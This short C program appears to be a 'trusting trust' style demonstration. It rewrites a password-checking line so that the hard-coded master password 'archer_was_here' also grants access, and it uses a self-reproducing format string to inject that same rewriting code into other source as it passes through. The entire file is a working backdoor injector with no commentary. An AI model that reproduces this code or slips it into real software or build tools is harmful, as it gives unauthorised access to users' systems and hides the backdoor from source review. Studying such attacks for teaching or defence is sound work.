#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/*
9: Tab
34: Quote
92: Backslash
*/
int main() {
    char* line = "  int num_lines = read_lines_to_array(fp, &lines);\n";
    int i = 3;
    FILE* out = stdout;
    char* lines[] = {line, line, line, line};
    
    char* inj_point = "  int num_lines = read_lines_to_array(fp, &lines);\n";
    char* before = "\tif (strcmp(passwords[user_index], password) == 0) {\n";
    char* after = "\tif (strcmp(passwords[user_index], password) == 0 || strcmp(\"archer_was_here\", password) == 0) {\n";
    if (strcmp(line, before) == 0) { // Replacement
        line = after;
    }
    if (i>=3 && strcmp(lines[i-3], inj_point) == 0) { // Injection
        char b[2048];
        char* f = "char* inj_point = %c  int num_lines = read_lines_to_array(fp, &lines);%cn%c;   char* before = %c%cif (strcmp(passwords[user_index], password) == 0) {%cn%c    ;   char* after = %c%cif (strcmp(passwords[user_index], password) == 0 || strcmp(%c%carcher_was_here%c%c, password) == 0) {%cn%c   ;   if (strcmp(line, before) == 0) {line=after;};  if (i >= 3 && strcmp(lines[i-3], inj_point) == 0) { char b[2048] ; char* f = %c%s%c ; sprintf(b, f, 34, 92, 34, 34, 9, 92, 34, 34, 9, 92, 34, 92, 34, 92, 34, 34, f, 34); fwrite(b, strlen(b), 1, out);  }";
        sprintf(b, f, 34, 92, 34, 34, 9, 92, 34, 34, 9, 92, 34, 92, 34, 92, 34, 34, f, 34);
        fwrite(b, strlen(b), 1, out);
    }
}